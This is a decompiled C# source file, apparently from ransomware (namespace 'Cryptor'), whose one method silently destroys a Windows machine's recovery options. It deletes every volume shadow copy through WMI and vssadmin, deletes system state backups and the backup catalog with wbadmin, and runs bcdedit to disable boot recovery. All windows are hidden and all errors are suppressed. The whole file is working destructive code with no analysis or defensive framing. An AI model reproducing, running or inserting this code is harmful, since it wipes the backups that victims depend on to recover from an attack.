using System;
using System.Diagnostics;
using System.Management;

namespace Cryptor
{
	// Token: 0x02000009 RID: 9
	internal class Shadow
	{
		// Token: 0x06000022 RID: 34 RVA: 0x00003058 File Offset: 0x00001258
		public static void DelCopy()
		{
			try
			{
				ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
				SelectQuery query = new SelectQuery("SELECT * FROM Win32_ShadowCopy");
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query))
				{
					ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
					if (managementObjectCollection.Count > 0)
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							try
							{
								ManagementBaseObject methodParameters = managementObject.GetMethodParameters("Delete");
								managementObject.InvokeMethod("Delete", methodParameters, null);
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				new Process
				{
					StartInfo = 
					{
						FileName = "vssadmin.exe",
						Arguments = "delete shadows /all /quiet",
						UseShellExecute = false,
						CreateNoWindow = true
					}
				}.Start();
			}
			catch
			{
			}
			try
			{
				new Process
				{
					StartInfo = 
					{
						FileName = "wbadmin.exe",
						Arguments = "DELETE SYSTEMSTATEBACKUP",
						UseShellExecute = false,
						CreateNoWindow = true
					}
				}.Start();
			}
			catch
			{
			}
			try
			{
				new Process
				{
					StartInfo = 
					{
						FileName = "wbadmin.exe",
						Arguments = "DELETE SYSTEMSTATEBACKUP -deleteOldest",
						UseShellExecute = false,
						CreateNoWindow = true
					}
				}.Start();
			}
			catch
			{
			}
			Shadow.ExecuteCommand("cmd.exe", "/c vssadmin delete shadows /all /quiet");
			Shadow.ExecuteCommand("cmd.exe", "/c wmic shadowcopy delete");
			Shadow.ExecuteCommand("cmd.exe", "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures");
			Shadow.ExecuteCommand("cmd.exe", "/c bcdedit /set {default} recoveryenabled no");
			Shadow.ExecuteCommand("cmd.exe", "/c wbadmin delete catalog -quiet");
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003270 File Offset: 0x00001470
		private static void ExecuteCommand(string command, string arguments)
		{
			try
			{
				new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = command,
						Arguments = arguments,
						RedirectStandardOutput = true,
						RedirectStandardError = true,
						UseShellExecute = false,
						CreateNoWindow = true
					}
				}.Start();
			}
			catch
			{
			}
		}
	}
}
